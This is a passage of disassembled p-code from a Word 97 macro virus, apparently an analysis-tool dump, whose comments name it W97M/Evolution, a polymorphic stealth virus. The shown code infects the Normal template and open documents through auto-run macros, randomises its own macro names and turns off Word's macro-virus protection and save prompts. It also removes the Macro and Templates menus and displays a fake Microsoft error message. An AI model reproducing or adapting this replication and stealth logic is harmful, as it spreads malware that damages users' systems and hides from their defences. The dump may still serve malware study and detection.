' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #405:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "wordbasic.filesave"
' 	PrintItemNL 
' Line #406:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #407:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #408:
' 	EndIfBlock 
' Line #409:
' 	EndFunc 
' Line #410:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #411:
' 	FuncDefn (Function Norminf())
' Line #412:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #413:
' 	OnError (Resume Next) 
' Line #414:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #415:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #416:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #417:
' 	LitDI2 0x0001 
' 	Ld FileID2 
' 	LineInput 
' Line #418:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #419:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #420:
' 	QuoteRem 0x0001 0x0000 ""
' Line #421:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #422:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #423:
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nexus 
' 	EndIf 
' Line #424:
' 	QuoteRem 0x0001 0x0000 ""
' Line #425:
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #426:
' 	QuoteRem 0x0001 0x0000 ""
' Line #427:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #428:
' 	QuoteRem 0x0001 0x0000 ""
' Line #429:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #430:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #431:
' 	EndIfBlock 
' Line #432:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #433:
' 	Label nexus 
' Line #434:
' 	QuoteRem 0x0001 0x0000 ""
' Line #435:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	NextVar 
' Line #436:
' 	QuoteRem 0x0001 0x0000 ""
' Line #437:
' 	StartWithExpr 
' 	Ld FileID2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #438:
' 	EndWith 
' Line #439:
' 	LitStr 0x0092 "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support."
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' Line #440:
' 	EndFunc 
' Line #441:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #442:
' 	FuncDefn (Function FileInft())
' Line #443:
' 	OnError (Resume Next) 
' Line #444:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #445:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #446:
' 	QuoteRem 0x0001 0x0000 ""
' Line #447:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #448:
' 	LitDI2 0x0001 
' 	Ld FileID2 
' 	LineInput 
' Line #449:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #450:
' 	QuoteRem 0x0001 0x0000 ""
' Line #451:
' 	StartWithExpr 
' 	Ld FileID2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #452:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #453:
' 	EndWith 
' Line #454:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #455:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #456:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #457:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St WD 
' Line #458:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #459:
' 	StartForVariable 
' 	Ld evo 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld WD 
' 	For 
' Line #460:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #461:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #462:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #463:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #464:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #465:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #466:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #467:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #468:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #469:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #470:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #471:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #472:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #473:
' 	QuoteRem 0x0001 0x0000 ""
' Line #474:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #475:
' 	QuoteRem 0x0001 0x0000 ""
' Line #476:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #477:
' 	QuoteRem 0x0001 0x0000 ""
' Line #478:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #479:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #480:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #481:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #482:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #483:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #484:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #485:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #486:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #487:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #488:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #489:
' 	QuoteRem 0x0001 0x0000 ""
' Line #490:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #491:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #492:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #493:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #494:
' 	QuoteRem 0x0001 0x0000 ""
' Line #495:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #496:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #497:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #498:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #499:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #500:
' 	QuoteRem 0x0001 0x0000 ""
' Line #501:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #502:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #503:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #504:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #505:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #506:
' 	QuoteRem 0x0001 0x0000 ""
' Line #507:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #508:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #509:
' 	Ld VrusName 
' 	Ld a$ 
' 	Add 
' 	St VrusName 
' Line #510:
' 	StartForVariable 
' 	Ld evo 
' 	EndForVariable 
' 	NextVar 
' Line #511:
' 	QuoteRem 0x0001 0x0000 ""
' Line #512:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #513:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #514:
' 	Do 
' Line #515:
' 	QuoteRem 0x0001 0x0000 ""
' Line #516:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #517:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #518:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Virname 
' 	ParamNamed New 
' 	Ld VrusName 
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #519:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #520:
' 	QuoteRem 0x0000 0x0037 " RAPE v1.1 Macro Virus Name Randomizer - 2 to 8 letters"
' Line #521:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #522:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #523:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #524:
' 	QuoteRem 0x0001 0x0000 ""
' Line #525:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #526:
' 	QuoteRem 0x0001 0x0000 ""
' Line #527:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nex 
' 	EndIf 
' Line #528:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo rite 
' 	EndIf 
' Line #529:
' 	Label rite 
' Line #530:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #531:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #532:
' 	QuoteRem 0x0001 0x0000 ""
' Line #533:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #534:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #535:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #536:
' 	Label nex 
' Line #537:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #538:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #539:
' 	EndFunc 
' Line #540:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #541:
' 	FuncDefn (Function Evolution())
' Line #542:
' 	OnError (Resume Next) 
' Line #543:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #544:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #545:
' 	ArgsCall (Call) Self_Recognition 0x0000 
' Line #546:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #547:
' 	ArgsCall (Call) Armor_Status 0x0000 
' Line #548:
' 	QuoteRem 0x0001 0x0000 ""
' Line #549:
' 	ArgsCall (Call) Export_Code 0x0000 
' Line #550:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #551:
' 	ArgsCall (Call) Polymorphic_Check 0x0000 
' Line #552:
' 	ArgsCall (Call) Evolve 0x0000 
' Line #553:
' 	Ld Hostinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Norminf 0x0000 
' 	EndIf 
' Line #554:
' 	Ld FileInf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) FileInft 0x0000 
' 	EndIf 
' Line #555:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #556:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #557:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #558:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #559:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #560:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #561:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #562:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #563:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #564:
' 	QuoteRem 0x0000 0x000F " W97M/Evolution"
' Line #565:
' 	QuoteRem 0x0000 0x002B " W97M/Evolution .a Variant by Nex and Error"
' Line #566:
' 	QuoteRem 0x0000 0x0027 " Polymorphic Stealth Word97 Macro Virus"
' Line #567:
' 	QuoteRem 0x0000 0x001A " All Things Must Change..."
' Line #568:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #569:
' 	QuoteRem 0x0000 0x004F " Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error"
' Line #570:
' 	QuoteRem 0x0001 0x0000 ""
' Line #571:
' 	QuoteRem 0x0000 0x0010 " RAPE v1.1 does:"
' Line #572:
' 	QuoteRem 0x0000 0x0035 " Randomly Morphs Source Code by Adding Random Remarks"
' Line #573:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #574:
' 	QuoteRem 0x0000 0x003A " Randomly Selects Source Code Export File - Then Morphs it"
' Line #575:
' 	QuoteRem 0x0001 0x0000 ""
' Line #576:
' 	QuoteRem 0x0000 0x0022 " Randomly Creates Virus Macro Name"
' Line #577:
' 	QuoteRem 0x0001 0x0000 ""
' Line #578:
' 	QuoteRem 0x0000 0x0026 " Randomly Adds 1 to 6 Commands to Code"
' Line #579:
' 	EndFunc 
' Line #580:
' 	FuncDefn (Sub AutoClose())
' Line #581:
' 	OnError (Resume Next) 
' Line #582:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #583:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #584:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #585:
' 	QuoteRem 0x0001 0x0000 ""
' Line #586:
' 	Ld Wordbasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #587:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #588:
' 	EndSub 
' Line #589:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #590:
' 	FuncDefn (Sub AutoExec())
' Line #591:
' 	OnError (Resume Next) 
' Line #592:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #593:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #594:
' 	ArgsCall (Call) Armor_Status 0x0000 
' Line #595:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #596:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #597:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #598:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #599:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #600:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #601:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #602:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #603:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #604:
' 	EndSub 
' Line #605:
' 	FuncDefn (Sub AutoExit())
' Line #606:
' 	OnError (Resume Next) 
' Line #607:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #608:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #609:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #610:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #611:
' 	QuoteRem 0x0001 0x0000 ""
' Line #612:
' 	LitStr 0x001D "C:\Windows\System\PMF1199.cpl"
' 	ArgsLd Dir 0x0001 
' 	St PMExport 
' Line #613:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #614:
' 	Ld PMExport 
' 	LitStr 0x000B "PMF1199.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PMFile_Yes 
' 	EndIf 
' Line #615:
' 	QuoteRem 0x0001 0x0000 ""
' Line #616:
' 	Ld PMFile_Yes 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #617:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #618:
' 	LitStr 0x001D "C:\Windows\System\PMF1199.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #619:
' 	QuoteRem 0x0001 0x0000 ""
' Line #620:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "W97M/Evolution .a by Nex"
' 	PrintItemNL 
' Line #621:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error"
' 	PrintItemNL 
' Line #622:
' 	QuoteRem 0x0001 0x0000 ""
' Line #623:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #624:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #625:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #626:
' 	LitDI2 0x0002 
' 	Ld FileID 
' 	LineInput 
' Line #627:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #628:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #629:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #630:
' 	Ld FileID 
' 	LitDI2 0x0009 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #631:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #632:
' 	LitDI2 0x0009 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "' EOF"
' 	PrintItemNL 
' Line #633:
' 	LitDI2 0x0009 
' 	Sharp 
' 	Close 0x0001 
' Line #634:
' 	QuoteRem 0x0001 0x0000 ""
' Line #635:
' 	Ld FileID 
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #636:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #637:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St W 
' Line #638:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld W 
' 	For 
' Line #639:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #640:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #641:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #642:
' 	QuoteRem 0x0001 0x0000 ""
' Line #643:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #644:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #645:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #646:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #647:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #648:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #649:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #650:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #651:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #652:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #653:
' 	QuoteRem 0x0001 0x0000 ""
' Line #654:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #655:
' 	QuoteRem 0x0001 0x0000 ""
' Line #656:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #657:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #658:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #659:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #660:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #661:
' 	QuoteRem 0x0001 0x0000 ""
' Line #662:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #663:
' 	QuoteRem 0x0001 0x0000 ""
' Line #664:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #665:
' 	QuoteRem 0x0001 0x0000 ""
' Line #666:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #667:
' 	QuoteRem 0x0001 0x0000 ""
' Line #668:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #669:
' 	QuoteRem 0x0001 0x0000 ""
' Line #670:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #671:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #672:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #673:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #674:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #675:
' 	QuoteRem 0x0001 0x0000 ""
' Line #676:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #677:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #678:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #679:
